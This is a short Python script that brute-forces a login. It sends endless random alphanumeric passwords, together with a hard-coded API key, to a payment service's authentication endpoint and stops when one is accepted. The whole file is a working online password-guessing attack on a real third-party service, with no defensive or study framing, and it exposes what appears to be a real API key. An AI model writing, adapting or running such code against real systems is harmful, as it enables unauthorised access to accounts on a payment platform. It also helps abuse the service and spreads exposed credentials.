import os
import requests
import string
import random
from colorama import Fore
os.system('cls')

# Code to brut force a password
while True:
    length = random.randint(5, 50)
    pwd = str(''.join(
        random.choices(
            string.ascii_letters + string.digits,
            k=length
        )
    ))
    print(Fore.WHITE +
          f'\n[INFO] Trying to brut force password: {pwd} - length: {length}')
    # api call
    response = requests.post(
        'https://client.cinetpay.com/v1/auth/login',
        data={
            'apikey': '208399534962592c3add2e16.66241584',
            'password': pwd,
        }
    )
    # get response
    result = response.json()
    print(result['message'])
    # visualize result
    if result['code'] != 0:
        print(Fore.RED + f'[ERROR] Failed to brut force with password: {pwd}')
        continue
    else:
        print(Fore.GREEN + f'[SUCCESS] The password is: {pwd}')
        break
# the end
print(Fore.WHITE)
